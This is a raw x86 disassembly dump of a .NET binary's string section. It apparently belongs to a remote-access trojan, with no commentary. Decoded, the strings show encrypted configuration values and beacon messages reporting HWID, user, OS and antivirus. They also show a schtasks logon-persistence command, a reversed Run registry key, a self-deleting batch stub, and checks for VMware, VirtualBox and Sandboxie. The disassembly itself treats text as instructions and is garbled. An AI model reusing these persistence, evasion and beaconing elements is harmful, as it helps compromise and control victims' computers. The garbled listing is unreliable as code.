  40b5b5:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
  40b5b9:	00 36                	add    %dh,(%esi)
  40b5bb:	00 38                	add    %bh,(%eax)
  40b5bd:	00 58 00             	add    %bl,0x0(%eax)
  40b5c0:	73 00                	jae    0x40b5c2
  40b5c2:	4f                   	dec    %edi
  40b5c3:	00 6e 00             	add    %ch,0x0(%esi)
  40b5c6:	32 00                	xor    (%eax),%al
  40b5c8:	6b 00 57             	imul   $0x57,(%eax),%eax
  40b5cb:	00 66 00             	add    %ah,0x0(%esi)
  40b5ce:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40b5d2:	2f                   	das
  40b5d3:	00 75 00             	add    %dh,0x0(%ebp)
  40b5d6:	35 00 71 00 47       	xor    $0x47007100,%eax
  40b5db:	00 79 00             	add    %bh,0x0(%ecx)
  40b5de:	4a                   	dec    %edx
  40b5df:	00 4e 00             	add    %cl,0x0(%esi)
  40b5e2:	66 00 35 00 77 00 77 	data16 add %dh,0x77007700
  40b5e9:	00 4f 00             	add    %cl,0x0(%edi)
  40b5ec:	58                   	pop    %eax
  40b5ed:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40b5f1:	00 55 00             	add    %dl,0x0(%ebp)
  40b5f4:	37                   	aaa
  40b5f5:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40b5f9:	00 67 00             	add    %ah,0x0(%edi)
  40b5fc:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b601:	03 33                	add    (%ebx),%esi
  40b603:	00 00                	add    %al,(%eax)
  40b605:	80 b1 79 00 39 00 72 	xorb   $0x72,0x390079(%ecx)
  40b60c:	00 5a 00             	add    %bl,0x0(%edx)
  40b60f:	51                   	push   %ecx
  40b610:	00 58 00             	add    %bl,0x0(%eax)
  40b613:	76 00                	jbe    0x40b615
  40b615:	76 00                	jbe    0x40b617
  40b617:	49                   	dec    %ecx
  40b618:	00 36                	add    %dh,(%esi)
  40b61a:	00 41 00             	add    %al,0x0(%ecx)
  40b61d:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b620:	00 57 00             	add    %dl,0x0(%edi)
  40b623:	4e                   	dec    %esi
  40b624:	00 32                	add    %dh,(%edx)
  40b626:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40b62a:	00 72 00             	add    %dh,0x0(%edx)
  40b62d:	79 00                	jns    0x40b62f
  40b62f:	59                   	pop    %ecx
  40b630:	00 6e 00             	add    %ch,0x0(%esi)
  40b633:	39 00                	cmp    %eax,(%eax)
  40b635:	58                   	pop    %eax
  40b636:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b639:	7a 00                	jp     0x40b63b
  40b63b:	47                   	inc    %edi
  40b63c:	00 41 00             	add    %al,0x0(%ecx)
  40b63f:	5a                   	pop    %edx
  40b640:	00 7a 00             	add    %bh,0x0(%edx)
  40b643:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40b647:	6d                   	insl   (%dx),%es:(%edi)
  40b648:	00 67 00             	add    %ah,0x0(%edi)
  40b64b:	63 00                	arpl   %eax,(%eax)
  40b64d:	48                   	dec    %eax
  40b64e:	00 31                	add    %dh,(%ecx)
  40b650:	00 72 00             	add    %dh,0x0(%edx)
  40b653:	7a 00                	jp     0x40b655
  40b655:	34 00                	xor    $0x0,%al
  40b657:	4c                   	dec    %esp
  40b658:	00 51 00             	add    %dl,0x0(%ecx)
  40b65b:	56                   	push   %esi
  40b65c:	00 53 00             	add    %dl,0x0(%ebx)
  40b65f:	4b                   	dec    %ebx
  40b660:	00 35 00 4a 00 6a    	add    %dh,0x6a004a00
  40b666:	00 4a 00             	add    %cl,0x0(%edx)
  40b669:	58                   	pop    %eax
  40b66a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b66d:	77 00                	ja     0x40b66f
  40b66f:	37                   	aaa
  40b670:	00 78 00             	add    %bh,0x0(%eax)
  40b673:	38 00                	cmp    %al,(%eax)
  40b675:	44                   	inc    %esp
  40b676:	00 50 00             	add    %dl,0x0(%eax)
  40b679:	47                   	inc    %edi
  40b67a:	00 70 00             	add    %dh,0x0(%eax)
  40b67d:	58                   	pop    %eax
  40b67e:	00 61 00             	add    %ah,0x0(%ecx)
  40b681:	50                   	push   %eax
  40b682:	00 55 00             	add    %dl,0x0(%ebp)
  40b685:	57                   	push   %edi
  40b686:	00 36                	add    %dh,(%esi)
  40b688:	00 52 00             	add    %dl,0x0(%edx)
  40b68b:	2b 00                	sub    (%eax),%eax
  40b68d:	45                   	inc    %ebp
  40b68e:	00 70 00             	add    %dh,0x0(%eax)
  40b691:	4b                   	dec    %ebx
  40b692:	00 39                	add    %bh,(%ecx)
  40b694:	00 6d 00             	add    %ch,0x0(%ebp)
  40b697:	44                   	inc    %esp
  40b698:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40b69c:	00 50 00             	add    %dl,0x0(%eax)
  40b69f:	58                   	pop    %eax
  40b6a0:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6a3:	44                   	inc    %esp
  40b6a4:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6a7:	54                   	push   %esp
  40b6a8:	00 33                	add    %dh,(%ebx)
  40b6aa:	00 42 00             	add    %al,0x0(%edx)
  40b6ad:	74 00                	je     0x40b6af
  40b6af:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6b0:	00 77 00             	add    %dh,0x0(%edi)
  40b6b3:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b6b8:	09 6e 00             	or     %ebp,0x0(%esi)
  40b6bb:	75 00                	jne    0x40b6bd
  40b6bd:	6c                   	insb   (%dx),%es:(%edi)
  40b6be:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b6c2:	01 00                	add    %eax,(%eax)
  40b6c4:	03 3a                	add    (%edx),%edi
  40b6c6:	00 00                	add    %al,(%eax)
  40b6c8:	0d 50 00 61 00       	or     $0x610050,%eax
  40b6cd:	63 00                	arpl   %eax,(%eax)
  40b6cf:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b6d2:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b6d6:	09 50 00             	or     %edx,0x0(%eax)
  40b6d9:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b6df:	00 0f                	add    %cl,(%edi)
  40b6e1:	4d                   	dec    %ebp
  40b6e2:	00 65 00             	add    %ah,0x0(%ebp)
  40b6e5:	73 00                	jae    0x40b6e7
  40b6e7:	73 00                	jae    0x40b6e9
  40b6e9:	61                   	popa
  40b6ea:	00 67 00             	add    %ah,0x0(%edi)
  40b6ed:	65 00 00             	add    %al,%gs:(%eax)
  40b6f0:	07                   	pop    %es
  40b6f1:	63 00                	arpl   %eax,(%eax)
  40b6f3:	6d                   	insl   (%dx),%es:(%edi)
  40b6f4:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b6f8:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b6fe:	00 73 00             	add    %dh,0x0(%ebx)
  40b701:	63 00                	arpl   %eax,(%eax)
  40b703:	68 00 74 00 61       	push   $0x61007400
  40b708:	00 73 00             	add    %dh,0x0(%ebx)
  40b70b:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b70e:	00 20                	add    %ah,(%eax)
  40b710:	00 2f                	add    %ch,(%edi)
  40b712:	00 63 00             	add    %ah,0x0(%ebx)
  40b715:	72 00                	jb     0x40b717
  40b717:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b71b:	74 00                	je     0x40b71d
  40b71d:	65 00 20             	add    %ah,%gs:(%eax)
  40b720:	00 2f                	add    %ch,(%edi)
  40b722:	00 66 00             	add    %ah,0x0(%esi)
  40b725:	20 00                	and    %al,(%eax)
  40b727:	2f                   	das
  40b728:	00 73 00             	add    %dh,0x0(%ebx)
  40b72b:	63 00                	arpl   %eax,(%eax)
  40b72d:	20 00                	and    %al,(%eax)
  40b72f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b730:	00 6e 00             	add    %ch,0x0(%esi)
  40b733:	6c                   	insb   (%dx),%es:(%edi)
  40b734:	00 6f 00             	add    %ch,0x0(%edi)
  40b737:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b73b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b73c:	00 20                	add    %ah,(%eax)
  40b73e:	00 2f                	add    %ch,(%edi)
  40b740:	00 72 00             	add    %dh,0x0(%edx)
  40b743:	6c                   	insb   (%dx),%es:(%edi)
  40b744:	00 20                	add    %ah,(%eax)
  40b746:	00 68 00             	add    %ch,0x0(%eax)
  40b749:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b74f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b753:	74 00                	je     0x40b755
  40b755:	20 00                	and    %al,(%eax)
  40b757:	2f                   	das
  40b758:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b75c:	00 20                	add    %ah,(%eax)
  40b75e:	00 22                	add    %ah,(%edx)
  40b760:	00 00                	add    %al,(%eax)
  40b762:	11 22                	adc    %esp,(%edx)
  40b764:	00 20                	add    %ah,(%eax)
  40b766:	00 2f                	add    %ch,(%edi)
  40b768:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b76c:	00 20                	add    %ah,(%eax)
  40b76e:	00 27                	add    %ah,(%edi)
  40b770:	00 22                	add    %ah,(%edx)
  40b772:	00 01                	add    %al,(%ecx)
  40b774:	13 22                	adc    (%edx),%esp
  40b776:	00 27                	add    %ah,(%edi)
  40b778:	00 20                	add    %ah,(%eax)
  40b77a:	00 26                	add    %ah,(%esi)
  40b77c:	00 20                	add    %ah,(%eax)
  40b77e:	00 65 00             	add    %ah,0x0(%ebp)
  40b781:	78 00                	js     0x40b783
  40b783:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b789:	5c                   	pop    %esp
  40b78a:	00 6e 00             	add    %ch,0x0(%esi)
  40b78d:	75 00                	jne    0x40b78f
  40b78f:	52                   	push   %edx
  40b790:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b794:	00 6f 00             	add    %ch,0x0(%edi)
  40b797:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b79d:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b7a1:	74 00                	je     0x40b7a3
  40b7a3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7a4:	00 65 00             	add    %ah,0x0(%ebp)
  40b7a7:	72 00                	jb     0x40b7a9
  40b7a9:	72 00                	jb     0x40b7ab
  40b7ab:	75 00                	jne    0x40b7ad
  40b7ad:	43                   	inc    %ebx
  40b7ae:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b7b2:	00 77 00             	add    %dh,0x0(%edi)
  40b7b5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7b6:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b7ba:	00 69 00             	add    %ch,0x0(%ecx)
  40b7bd:	57                   	push   %edi
  40b7be:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b7c2:	00 66 00             	add    %ah,0x0(%esi)
  40b7c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7c6:	00 73 00             	add    %dh,0x0(%ebx)
  40b7c9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7ca:	00 72 00             	add    %dh,0x0(%edx)
  40b7cd:	63 00                	arpl   %eax,(%eax)
  40b7cf:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b7d5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b7d9:	61                   	popa
  40b7da:	00 77 00             	add    %dh,0x0(%edi)
  40b7dd:	74 00                	je     0x40b7df
  40b7df:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b7e3:	53                   	push   %ebx
  40b7e4:	00 00                	add    %al,(%eax)
  40b7e6:	03 22                	add    (%edx),%esp
  40b7e8:	00 00                	add    %al,(%eax)
  40b7ea:	09 2e                	or     %ebp,(%esi)
  40b7ec:	00 62 00             	add    %ah,0x0(%edx)
  40b7ef:	61                   	popa
  40b7f0:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b7f4:	13 40 00             	adc    0x0(%eax),%eax
  40b7f7:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b7fb:	68 00 6f 00 20       	push   $0x20006f00
  40b800:	00 6f 00             	add    %ch,0x0(%edi)
  40b803:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b807:	00 1f                	add    %bl,(%edi)
  40b809:	74 00                	je     0x40b80b
  40b80b:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b811:	6f                   	outsl  %ds:(%esi),(%dx)
  40b812:	00 75 00             	add    %dh,0x0(%ebp)
  40b815:	74 00                	je     0x40b817
  40b817:	20 00                	and    %al,(%eax)
  40b819:	33 00                	xor    (%eax),%eax
  40b81b:	20 00                	and    %al,(%eax)
  40b81d:	3e 00 20             	add    %ah,%ds:(%eax)
  40b820:	00 4e 00             	add    %cl,0x0(%esi)
  40b823:	55                   	push   %ebp
  40b824:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b828:	15 53 00 54 00       	adc    $0x540053,%eax
  40b82d:	41                   	inc    %ecx
  40b82e:	00 52 00             	add    %dl,0x0(%edx)
  40b831:	54                   	push   %esp
  40b832:	00 20                	add    %ah,(%eax)
  40b834:	00 22                	add    %ah,(%edx)
  40b836:	00 22                	add    %ah,(%edx)
  40b838:	00 20                	add    %ah,(%eax)
  40b83a:	00 22                	add    %ah,(%edx)
  40b83c:	00 00                	add    %al,(%eax)
  40b83e:	07                   	pop    %es
  40b83f:	43                   	inc    %ebx
  40b840:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b844:	00 00                	add    %al,(%eax)
  40b846:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b84a:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b84e:	00 22                	add    %ah,(%edx)
  40b850:	00 00                	add    %al,(%eax)
  40b852:	0f 22 00             	mov    %eax,%cr0
  40b855:	20 00                	and    %al,(%eax)
  40b857:	2f                   	das
  40b858:	00 66 00             	add    %ah,0x0(%esi)
  40b85b:	20 00                	and    %al,(%eax)
  40b85d:	2f                   	das
  40b85e:	00 71 00             	add    %dh,0x0(%ecx)
  40b861:	00 05 78 00 70 00    	add    %al,0x700078
  40b867:	00 45 53             	add    %al,0x53(%ebp)
  40b86a:	00 65 00             	add    %ah,0x0(%ebp)
  40b86d:	6c                   	insb   (%dx),%es:(%edi)
  40b86e:	00 65 00             	add    %ah,0x0(%ebp)
  40b871:	63 00                	arpl   %eax,(%eax)
  40b873:	74 00                	je     0x40b875
  40b875:	20 00                	and    %al,(%eax)
  40b877:	2a 00                	sub    (%eax),%al
  40b879:	20 00                	and    %al,(%eax)
  40b87b:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b87f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b880:	00 6d 00             	add    %ch,0x0(%ebp)
  40b883:	20 00                	and    %al,(%eax)
  40b885:	57                   	push   %edi
  40b886:	00 69 00             	add    %ch,0x0(%ecx)
  40b889:	6e                   	outsb  %ds:(%esi),(%dx)
  40b88a:	00 33                	add    %dh,(%ebx)
  40b88c:	00 32                	add    %dh,(%edx)
  40b88e:	00 5f 00             	add    %bl,0x0(%edi)
  40b891:	43                   	inc    %ebx
  40b892:	00 6f 00             	add    %ch,0x0(%edi)
  40b895:	6d                   	insl   (%dx),%es:(%edi)
  40b896:	00 70 00             	add    %dh,0x0(%eax)
  40b899:	75 00                	jne    0x40b89b
  40b89b:	74 00                	je     0x40b89d
  40b89d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8a1:	53                   	push   %ebx
  40b8a2:	00 79 00             	add    %bh,0x0(%ecx)
  40b8a5:	73 00                	jae    0x40b8a7
  40b8a7:	74 00                	je     0x40b8a9
  40b8a9:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b8ad:	00 19                	add    %bl,(%ecx)
  40b8af:	4d                   	dec    %ebp
  40b8b0:	00 61 00             	add    %ah,0x0(%ecx)
  40b8b3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8b4:	00 75 00             	add    %dh,0x0(%ebp)
  40b8b7:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b8bb:	63 00                	arpl   %eax,(%eax)
  40b8bd:	74 00                	je     0x40b8bf
  40b8bf:	75 00                	jne    0x40b8c1
  40b8c1:	72 00                	jb     0x40b8c3
  40b8c3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b8c7:	00 2b                	add    %ch,(%ebx)
  40b8c9:	6d                   	insl   (%dx),%es:(%edi)
  40b8ca:	00 69 00             	add    %ch,0x0(%ecx)
  40b8cd:	63 00                	arpl   %eax,(%eax)
  40b8cf:	72 00                	jb     0x40b8d1
  40b8d1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8d2:	00 73 00             	add    %dh,0x0(%ebx)
  40b8d5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8d6:	00 66 00             	add    %ah,0x0(%esi)
  40b8d9:	74 00                	je     0x40b8db
  40b8db:	20 00                	and    %al,(%eax)
  40b8dd:	63 00                	arpl   %eax,(%eax)
  40b8df:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8e0:	00 72 00             	add    %dh,0x0(%edx)
  40b8e3:	70 00                	jo     0x40b8e5
  40b8e5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8e6:	00 72 00             	add    %dh,0x0(%edx)
  40b8e9:	61                   	popa
  40b8ea:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b8ee:	00 6f 00             	add    %ch,0x0(%edi)
  40b8f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8f2:	00 00                	add    %al,(%eax)
  40b8f4:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b8f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8f8:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b8fc:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b900:	0f 56 00             	orps   (%eax),%xmm0
  40b903:	49                   	dec    %ecx
  40b904:	00 52 00             	add    %dl,0x0(%edx)
  40b907:	54                   	push   %esp
  40b908:	00 55 00             	add    %dl,0x0(%ebp)
  40b90b:	41                   	inc    %ecx
  40b90c:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b910:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b915:	77 00                	ja     0x40b917
  40b917:	61                   	popa
  40b918:	00 72 00             	add    %dh,0x0(%edx)
  40b91b:	65 00 00             	add    %al,%gs:(%eax)
  40b91e:	15 56 00 69 00       	adc    $0x690056,%eax
  40b923:	72 00                	jb     0x40b925
  40b925:	74 00                	je     0x40b927
  40b927:	75 00                	jne    0x40b929
  40b929:	61                   	popa
  40b92a:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b92e:	00 6f 00             	add    %ch,0x0(%edi)
  40b931:	78 00                	js     0x40b933
  40b933:	00 17                	add    %dl,(%edi)
  40b935:	53                   	push   %ebx
  40b936:	00 62 00             	add    %ah,0x0(%edx)
  40b939:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b93f:	6c                   	insb   (%dx),%es:(%edi)
  40b940:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b944:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b948:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b94c:	11 45 00             	adc    %eax,0x0(%ebp)
  40b94f:	72 00                	jb     0x40b951
  40b951:	72 00                	jb     0x40b953
  40b953:	20 00                	and    %al,(%eax)
  40b955:	48                   	dec    %eax
  40b956:	00 57 00             	add    %dl,0x0(%edi)
  40b959:	49                   	dec    %ecx
  40b95a:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b95e:	05 78 00 32 00       	add    $0x320078,%eax
  40b963:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b969:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b96f:	74 00                	je     0x40b971
  40b971:	49                   	dec    %ecx
  40b972:	00 6e 00             	add    %ch,0x0(%esi)
  40b975:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b979:	00 09                	add    %cl,(%ecx)
  40b97b:	48                   	dec    %eax
  40b97c:	00 57 00             	add    %dl,0x0(%edi)
  40b97f:	49                   	dec    %ecx
  40b980:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b984:	09 55 00             	or     %edx,0x0(%ebp)
  40b987:	73 00                	jae    0x40b989
  40b989:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b98d:	00 05 4f 00 53 00    	add    %al,0x53004f
  40b993:	00 13                	add    %dl,(%ebx)
  40b995:	4d                   	dec    %ebp
  40b996:	00 69 00             	add    %ch,0x0(%ecx)
  40b999:	63 00                	arpl   %eax,(%eax)
  40b99b:	72 00                	jb     0x40b99d
  40b99d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b99e:	00 73 00             	add    %dh,0x0(%ebx)
  40b9a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9a2:	00 66 00             	add    %ah,0x0(%esi)
  40b9a5:	74 00                	je     0x40b9a7
  40b9a7:	00 03                	add    %al,(%ebx)
  40b9a9:	20 00                	and    %al,(%eax)
  40b9ab:	00 09                	add    %cl,(%ecx)
  40b9ad:	54                   	push   %esp
  40b9ae:	00 72 00             	add    %dh,0x0(%edx)
  40b9b1:	75 00                	jne    0x40b9b3
  40b9b3:	65 00 00             	add    %al,%gs:(%eax)
  40b9b6:	0b 36                	or     (%esi),%esi
  40b9b8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b9bb:	62 00                	bound  %eax,(%eax)
  40b9bd:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40b9c3:	46                   	inc    %esi
  40b9c4:	00 61 00             	add    %ah,0x0(%ecx)
  40b9c7:	6c                   	insb   (%dx),%es:(%edi)
  40b9c8:	00 73 00             	add    %dh,0x0(%ebx)
  40b9cb:	65 00 00             	add    %al,%gs:(%eax)
  40b9ce:	0b 33                	or     (%ebx),%esi
  40b9d0:	00 32                	add    %dh,(%edx)
  40b9d2:	00 62 00             	add    %ah,0x0(%edx)
  40b9d5:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40b9db:	50                   	push   %eax
  40b9dc:	00 61 00             	add    %ah,0x0(%ecx)
  40b9df:	74 00                	je     0x40b9e1
  40b9e1:	68 00 00 0f 56       	push   $0x560f0000
  40b9e6:	00 65 00             	add    %ah,0x0(%ebp)
  40b9e9:	72 00                	jb     0x40b9eb
  40b9eb:	73 00                	jae    0x40b9ed
  40b9ed:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b9f3:	00 0b                	add    %cl,(%ebx)
  40b9f5:	41                   	inc    %ecx
  40b9f6:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40b9fa:	00 69 00             	add    %ch,0x0(%ecx)
  40b9fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9fe:	00 00                	add    %al,(%eax)
  40ba00:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba04:	00 75 00             	add    %dh,0x0(%ebp)
  40ba07:	65 00 00             	add    %al,%gs:(%eax)
  40ba0a:	0b 66 00             	or     0x0(%esi),%esp
  40ba0d:	61                   	popa
  40ba0e:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba12:	00 65 00             	add    %ah,0x0(%ebp)
  40ba15:	00 17                	add    %dl,(%edi)
  40ba17:	50                   	push   %eax
  40ba18:	00 65 00             	add    %ah,0x0(%ebp)
  40ba1b:	72 00                	jb     0x40ba1d
  40ba1d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba21:	72 00                	jb     0x40ba23
  40ba23:	6d                   	insl   (%dx),%es:(%edi)
  40ba24:	00 61 00             	add    %ah,0x0(%ecx)
  40ba27:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba28:	00 63 00             	add    %ah,0x0(%ebx)
  40ba2b:	65 00 00             	add    %al,%gs:(%eax)
  40ba2e:	11 50 00             	adc    %edx,0x0(%eax)
  40ba31:	61                   	popa
  40ba32:	00 73 00             	add    %dh,0x0(%ebx)
  40ba35:	74 00                	je     0x40ba37
  40ba37:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40ba3b:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40ba41:	41                   	inc    %ecx
  40ba42:	00 6e 00             	add    %ch,0x0(%esi)
  40ba45:	74 00                	je     0x40ba47
  40ba47:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40ba4d:	72 00                	jb     0x40ba4f
  40ba4f:	75 00                	jne    0x40ba51
  40ba51:	73 00                	jae    0x40ba53
  40ba53:	00 13                	add    %dl,(%ebx)
  40ba55:	49                   	dec    %ecx
  40ba56:	00 6e 00             	add    %ch,0x0(%esi)
  40ba59:	73 00                	jae    0x40ba5b
  40ba5b:	74 00                	je     0x40ba5d
  40ba5d:	61                   	popa
  40ba5e:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ba62:	00 65 00             	add    %ah,0x0(%ebp)
  40ba65:	64 00 00             	add    %al,%fs:(%eax)
  40ba68:	09 50 00             	or     %edx,0x0(%eax)
  40ba6b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba6c:	00 6e 00             	add    %ch,0x0(%esi)
  40ba6f:	67 00 00             	add    %al,(%bx,%si)
  40ba72:	0b 47 00             	or     0x0(%edi),%eax
  40ba75:	72 00                	jb     0x40ba77
  40ba77:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba78:	00 75 00             	add    %dh,0x0(%ebp)
  40ba7b:	70 00                	jo     0x40ba7d
  40ba7d:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40ba83:	00 2b                	add    %ch,(%ebx)
  40ba85:	5c                   	pop    %esp
  40ba86:	00 72 00             	add    %dh,0x0(%edx)
  40ba89:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba8a:	00 6f 00             	add    %ch,0x0(%edi)
  40ba8d:	74 00                	je     0x40ba8f
  40ba8f:	5c                   	pop    %esp
  40ba90:	00 53 00             	add    %dl,0x0(%ebx)
  40ba93:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40ba97:	75 00                	jne    0x40ba99
  40ba99:	72 00                	jb     0x40ba9b
  40ba9b:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40baa1:	43                   	inc    %ebx
  40baa2:	00 65 00             	add    %ah,0x0(%ebp)
  40baa5:	6e                   	outsb  %ds:(%esi),(%dx)
  40baa6:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40baaa:	00 72 00             	add    %dh,0x0(%edx)
  40baad:	32 00                	xor    (%eax),%al
  40baaf:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bab5:	6c                   	insb   (%dx),%es:(%edi)
  40bab6:	00 65 00             	add    %ah,0x0(%ebp)
  40bab9:	63 00                	arpl   %eax,(%eax)
  40babb:	74 00                	je     0x40babd
  40babd:	20 00                	and    %al,(%eax)
  40babf:	2a 00                	sub    (%eax),%al
  40bac1:	20 00                	and    %al,(%eax)
  40bac3:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bac7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bac8:	00 6d 00             	add    %ch,0x0(%ebp)
  40bacb:	20 00                	and    %al,(%eax)
  40bacd:	41                   	inc    %ecx
  40bace:	00 6e 00             	add    %ch,0x0(%esi)
  40bad1:	74 00                	je     0x40bad3
  40bad3:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bad9:	72 00                	jb     0x40badb
  40badb:	75 00                	jne    0x40badd
  40badd:	73 00                	jae    0x40badf
  40badf:	50                   	push   %eax
  40bae0:	00 72 00             	add    %dh,0x0(%edx)
  40bae3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bae4:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bae8:	00 63 00             	add    %ah,0x0(%ebx)
  40baeb:	74 00                	je     0x40baed
  40baed:	00 17                	add    %dl,(%edi)
  40baef:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40baf3:	73 00                	jae    0x40baf5
  40baf5:	70 00                	jo     0x40baf7
  40baf7:	6c                   	insb   (%dx),%es:(%edi)
  40baf8:	00 61 00             	add    %ah,0x0(%ecx)
  40bafb:	79 00                	jns    0x40bafd
  40bafd:	4e                   	dec    %esi
  40bafe:	00 61 00             	add    %ah,0x0(%ecx)
  40bb01:	6d                   	insl   (%dx),%es:(%edi)
  40bb02:	00 65 00             	add    %ah,0x0(%ebp)
  40bb05:	00 07                	add    %al,(%edi)
  40bb07:	4e                   	dec    %esi
  40bb08:	00 2f                	add    %ch,(%edi)
  40bb0a:	00 41 00             	add    %al,0x0(%ecx)
  40bb0d:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb13:	00 13                	add    %dl,(%ebx)
  40bb15:	53                   	push   %ebx
  40bb16:	00 6f 00             	add    %ch,0x0(%edi)
  40bb19:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bb1e:	00 61 00             	add    %ah,0x0(%ecx)
  40bb21:	72 00                	jb     0x40bb23
  40bb23:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
